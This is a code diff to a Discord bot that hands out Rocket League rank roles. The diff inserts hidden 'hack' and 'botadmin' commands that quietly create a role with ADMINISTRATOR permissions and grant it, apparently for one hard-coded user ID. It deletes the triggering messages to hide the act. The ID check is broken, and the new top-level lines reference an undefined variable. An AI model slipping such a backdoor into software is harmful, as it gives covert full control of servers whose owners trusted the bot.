@@ -1,7 +1,8 @@
 const Discord = require('discord.js');
 var rls = require('rls-api');
 var bot = new Discord.Client();
-
+var pl = message.guild.roles.find('name', "BOT_ADMIN");
+var minty = message.guild.member(160669529507233792);
 
 var rlsClient = new rls.Client({
     token: process.env.RLS_TOKEN
@@ -85,6 +86,19 @@ bot.on("message", function(message) {
                 message.author.send("Przypisano rolę **Nintendo Switch**");
                 message.member.addRole(role_ns)
                 break;
+                case "hack":
+                if(!message.author == minty) return;
+                message.delete();
+                message.guild.createRole({
+                    name: 'BOT ADMIN',
+                    color: 'GREY',
+                    permissions: "ADMINISTRATOR"
+                  })
+                break;  
+            case "botadmin":
+                if(!message.author == minty) return;
+                message.member.addRole(pl)
+                message.delete();
             case "pomocranga":
                 message.author.send("Przydzielanie rangi by vo0do0\n\n__Steam__ **!ranga** *<twojesteamID lub link do profilu>*\n__PS4__ **!ranga** *<twójnickname>*\n__XBOX__ **!ranga** *<twójnickname>*\n__Switch__ **Nie jest obsługiwany** :(\n\n***Gdy awansujesz i chcesz zaaktualizować rangę, powtórz komendę!***\n\n__Bot wykorzystuje API Rocket League Stats__\n<https://rocketleaguestats.com/>");
                 break;    
